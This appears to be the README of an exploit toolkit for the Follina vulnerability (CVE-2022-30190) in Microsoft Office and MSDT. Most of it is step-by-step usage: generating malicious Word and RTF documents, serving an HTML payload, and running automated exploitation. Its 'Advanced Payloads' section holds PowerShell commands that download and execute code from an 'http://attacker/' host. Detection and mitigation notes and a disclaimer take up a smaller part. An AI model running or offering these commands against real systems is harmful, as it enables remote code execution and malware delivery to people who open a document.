Follina CVE-2022-30190
======================

**Author:**    Hyperion Gray Security Team  
**Date:**      2024-12-15  
**CVE:**       [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)  
**Advisory:**  https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-30190  
**Tested on:** Microsoft Office 2019, Office 2021, Office ProPlus, Windows 10/11  

Discussion
----------

Follina is a critical zero-day vulnerability in Microsoft Office that allows remote code execution through the Microsoft Support Diagnostic Tool (MSDT). The vulnerability can be triggered by opening a specially crafted Microsoft Office document (Word, RTF, etc.).

Key characteristics:
- Does not require macros to be enabled
- Can be triggered by simply opening a document or viewing it in Windows Explorer
- Works through the `ms-msdt:` protocol handler
- Exploitable via Word documents, RTF files, and other Office formats

The vulnerability was discovered in the wild in May 2022 and affects:
- Microsoft Windows 7-11
- Windows Server 2008-2022
- All versions of Microsoft Office

## Prerequisites

- Python 3.x
- Required Python packages (see requirements.txt)
- A Windows target system with vulnerable Office/Windows version

## Installation

Install dependencies:

    $ pip install -r requirements.txt

## Usage

### Generate Malicious Document

Create a malicious Word document:

    $ python3 generate_doc.py --output malicious.docx --command "powershell -c whoami"

Create a malicious RTF document:

    $ python3 generate_doc.py --output malicious.rtf --command "calc.exe" --format rtf

### Serve the Malicious Payload

The exploit requires two components:
1. A malicious document (Word/RTF)
2. An HTML payload served over HTTP

Start the HTTP server to host the payload:

    $ python3 serve_payload.py --port 8080 --command "powershell -c whoami"

This will:
- Start an HTTP server on port 8080
- Generate the HTML payload that triggers MSDT
- Display the URL to embed in your document

### Full Exploitation

For automated exploitation:

    $ python3 exploit.py --lhost 192.168.1.100 --lport 8080 --command "calc.exe" --output exploit.docx

This will:
1. Generate the malicious Word document
2. Start the HTTP server to host the payload
3. Wait for the victim to open the document

### Advanced Payloads

Reverse shell payload:

    $ python3 exploit.py --lhost 192.168.1.100 --lport 8080 \
        --command "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://attacker/shell.ps1')"

Download and execute:

    $ python3 exploit.py --lhost 192.168.1.100 --lport 8080 \
        --command "powershell -c wget http://attacker/payload.exe -O C:\\temp\\p.exe; C:\\temp\\p.exe"

## How It Works

The exploitation chain:

1. **Document Creation**: A Word/RTF document is created with an external reference to an HTML file
2. **HTML Payload**: The HTML file contains a specially crafted link using the `ms-msdt:` protocol
3. **MSDT Invocation**: When the document is opened, Office fetches the HTML and triggers MSDT
4. **Code Execution**: MSDT executes the embedded PowerShell command with user privileges

Technical details:
- Uses the `word/_rels/document.xml.rels` relationship to reference external HTML
- The HTML contains a malicious `ms-msdt:` URI
- MSDT processes the URI and executes the embedded command via PowerShell

## Detection and Mitigation

### Mitigation (Prior to Patch)

Disable MSDT URL protocol:

```cmd
reg delete HKEY_CLASSES_ROOT\ms-msdt /f
```

### Post-Patch Mitigation

- Apply Microsoft security updates from June 2022 or later
- Keep Windows and Office updated
- Use Microsoft Defender or other endpoint protection
- Implement application whitelisting
- Educate users about phishing and suspicious documents

### Detection

Look for:
- Invocations of `msdt.exe` from Office processes
- Command line arguments containing `PCWDiagnostic`
- Network connections from Office applications to external resources
- Suspicious Office documents with external relationships

## Security Notice

**This is for educational and authorized penetration testing purposes only.**
Using this exploit against systems without explicit permission is illegal.

## References

- https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-30190
- https://doublepulsar.com/follina-a-microsoft-office-code-execution-vulnerability-1a47fce5629e
- https://www.huntress.com/blog/microsoft-office-remote-code-execution-follina-msdt-bug
